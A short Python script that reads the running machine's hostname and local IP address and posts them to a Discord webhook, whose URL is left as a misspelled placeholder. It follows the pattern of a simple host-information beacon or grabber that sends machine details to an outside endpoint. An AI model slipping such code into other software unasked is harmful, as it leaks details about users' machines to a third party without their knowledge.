import socket
from dhooks import Webhook, Embed

hook = Webhook("Wenhook-URL")
hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)

print(f"{hostname} IP Addr:{local_ip}")
embed = Embed(
    description=f"IP: ``{local_ip}``",
    color=0xa9a9a9
)
embed.set_author(name=f"{hostname}")

hook.send(embed=embed)
